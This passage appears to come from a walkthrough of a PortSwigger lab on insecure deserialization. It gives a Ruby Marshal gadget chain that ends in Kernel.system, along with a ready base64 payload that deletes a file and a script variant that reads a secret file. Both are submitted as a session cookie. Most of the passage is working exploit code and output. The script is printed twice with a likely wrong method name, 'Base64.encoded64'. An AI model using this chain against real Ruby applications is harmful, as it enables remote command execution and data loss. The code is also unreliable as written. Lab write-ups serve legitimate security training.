i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
#puts payload.inspect
#puts Marshal.load(payload)
puts Base64.encoded64(payload)
```

>[!warning] You need to execute this code using **Ruby version `3.0.2`**. It won't run on newer versions, and adapting the code to the newest version and then using the output in the lab will not work.

```
BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRlYnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdlbTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2RfaWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dAY7DFQ7EjoMcmVzb2x2ZQ==
```

- If you inspect the payload in `Decoder`, you'll see the target command inside:

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab7/2.png]]


- Submit this value as a session cookie in any request. The application responds with `500 Internal Server Error`:z

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab7/3.png]]

![[images/walkthrough/PortSwigger/Insecure Deserialization/lab7/solved.png]]

Solved!

```ruby
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "cat /home/carlos/secret")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
#puts payload.inspect
#puts Marshal.load(payload)
puts Base64.encoded64(payload)
```